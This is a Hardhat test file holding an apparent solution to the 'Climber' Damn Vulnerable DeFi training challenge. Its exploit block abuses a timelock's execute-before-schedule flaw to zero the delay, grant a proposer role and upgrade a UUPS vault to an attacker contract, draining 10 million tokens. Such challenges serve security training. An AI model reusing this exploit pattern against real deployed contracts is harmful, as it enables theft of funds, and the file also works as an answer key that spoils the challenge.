const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        // deploy the malImp first
        const malImp = await (await ethers.getContractFactory('ClimberAttacker', attacker)).deploy();

        // lots of encode works,so we put all abi in this interface
        const iface = new ethers.utils.Interface([
            // timelock interface
            'function updateDelay(uint64 newDelay)',
            'function grantRole(bytes32 role, address account)',

            // uups interface
            'function upgradeToAndCall(address newImplementation, bytes memory data) payable',

            // attacker interfce
            'function attack(address token)'
        ]) 
        const targets = [
            this.timelock.address,
            this.timelock.address,
            this.vault.address
        ];
        const values = [0,0,0];

        const proposerRole = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('PROPOSER_ROLE'));
        const upgradeCalldata = iface.encodeFunctionData('attack', [this.token.address]);
        // console.log('attack:',upgradeCalldata);

        const dataElements = [
            iface.encodeFunctionData('updateDelay', [0]),
            iface.encodeFunctionData('grantRole', [proposerRole, this.vault.address]),
            iface.encodeFunctionData('upgradeToAndCall', [malImp.address, upgradeCalldata]),
        ];
       
        const salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('I am the Attacker'));

        const tx = await this.timelock.connect(attacker).execute(targets,values,dataElements,salt);
        await tx.wait();

        // this part is used to generate encode data used in the ClimberAttacker Contract
        // const iface2 = new ethers.utils.Interface([
        //     'function schedule(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)', 
        // ])
        // const edata = iface2.encodeFunctionData('schedule',[targets,values,dataElements,salt]);
        // console.log('schedule edata:', edata);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
